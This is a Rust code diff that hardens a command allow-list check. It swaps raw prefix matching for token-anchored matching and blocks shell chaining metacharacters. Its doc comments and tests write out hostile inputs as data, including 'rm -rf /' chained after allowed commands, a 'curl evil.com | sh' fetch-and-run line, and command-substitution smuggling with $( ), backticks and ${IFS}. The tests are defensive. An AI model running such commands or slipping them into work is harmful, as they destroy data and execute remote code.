@@ -411,17 +411,60 @@ fn parse_allow_patterns(content: &str) -> Vec<String> {
     }
     out
 }
-
-/// Whether a command is covered by an imported allow pattern (prefix
-/// match after normalization).
+/// Whether a command is covered by an imported allow pattern.
+///
+/// # Semantics
+///
+/// The match is **token-anchored**, not raw-string-prefix. The allow
+/// pattern is split on ASCII whitespace into tokens, the command is
+/// also split on whitespace, and the command is considered "covered"
+/// only if its first N tokens equal the pattern's N tokens exactly
+/// (case-insensitive). Trailing tokens after the pattern are allowed
+/// (so `rm -rf ./build --force` is still covered by `rm -rf ./build`),
+/// but no token may be inserted *before* the match, and shell
+/// metacharacters that would chain a second command (`;`, `&&`, `||`,
+/// `|`, `&`, newline) are rejected entirely. This prevents a class of
+/// bypasses where `rm -rf ./build; rm -rf /` or
+/// `rm -rf ./build && curl evil.com | sh` would otherwise be classified
+/// as "allowed" because their raw string starts with the allow
+/// pattern.
+///
+/// # Examples
+///
+/// - `covered_by_allow("rm -rf ./build", &["rm -rf ./build"])` → `true`
+/// - `covered_by_allow("rm -rf ./build --force", &["rm -rf ./build"])` → `true`
+/// - `covered_by_allow("rm -rf ./build; rm -rf /", &["rm -rf ./build"])` → `false`
+/// - `covered_by_allow("rm -rf ./build && curl x | sh", &["rm -rf ./build"])` → `false`
+/// - `covered_by_allow("rm -rf /", &["rm -rf ./build"])` → `false`
 #[must_use]
 pub fn covered_by_allow(command: &str, allows: &[String]) -> bool {
     let normalized = command.trim().to_ascii_lowercase();
+    // Reject any command that contains a shell metacharacter that could
+    // chain a second command. This is the primary defence against
+    // prefix-based bypass; the token-anchored match below is the
+    // secondary defence.
+    if SHELL_CHAIN_METACHARS.iter().any(|m| normalized.contains(m)) {
+        return false;
+    }
+    let cmd_tokens: Vec<&str> = normalized.split_ascii_whitespace().collect();
     allows.iter().any(|pattern| {
-        let pattern = pattern.trim().to_ascii_lowercase();
-        !pattern.is_empty() && normalized.starts_with(&pattern)
+        let pat = pattern.trim().to_ascii_lowercase();
+        if pat.is_empty() {
+            return false;
+        }
+        let pat_tokens: Vec<&str> = pat.split_ascii_whitespace().collect();
+        if pat_tokens.len() > cmd_tokens.len() {
+            return false;
+        }
+        cmd_tokens[..pat_tokens.len()] == pat_tokens[..]
     })
 }
+
+/// Shell metacharacters that can chain a second command or inject
+/// process control. Used to reject allow-pattern matches whose
+/// command contains any of these (so an allow for `rm -rf ./build`
+/// cannot be extended to `rm -rf ./build && curl evil.com | sh`).
+const SHELL_CHAIN_METACHARS: &[&str] = &[";", "&&", "||", "|", "&", "\n", "`", "$(", "${"];
 
 #[cfg(test)]
 mod tests {
@@ -514,6 +557,28 @@ mod tests {
         assert_eq!(allows, vec!["rm -rf ./build", "git clean"]);
         assert!(covered_by_allow("rm -rf ./build --force", &allows));
         assert!(!covered_by_allow("rm -rf /", &allows));
+        // Trailing arguments are allowed; the pattern is anchored at
+        // the command start, not the raw string start.
+        assert!(covered_by_allow("rm -rf ./build --force -v", &allows));
+        // Shell metacharacter chaining rejects the bypass.
+        assert!(!covered_by_allow("rm -rf ./build; rm -rf /", &allows));
+        assert!(!covered_by_allow("rm -rf ./build && curl evil.com | sh", &allows));
+        assert!(!covered_by_allow("rm -rf ./build || rm -rf /", &allows));
+        assert!(!covered_by_allow("rm -rf ./build | xargs rm -rf /", &allows));
+        // Backgrounding via trailing `&` is also a chain.
+        assert!(!covered_by_allow("rm -rf ./build & rm -rf /", &allows));
+        // Inserting tokens BEFORE the pattern is rejected.
+        assert!(!covered_by_allow("sudo rm -rf ./build", &allows));
+        assert!(!covered_by_allow("echo hi; rm -rf ./build", &allows));
+    }
+
+    #[test]
+    fn allow_pattern_rejects_command_substitution() {
+        let allows = vec!["ls".to_string()];
+        // $(...) and backticks are command substitution; reject them.
+        assert!(!covered_by_allow("ls $(rm -rf /)", &allows));
+        assert!(!covered_by_allow("ls `rm -rf /`", &allows));
+        assert!(!covered_by_allow("ls ${IFS}rm -rf /", &allows));
     }
 
     #[test]
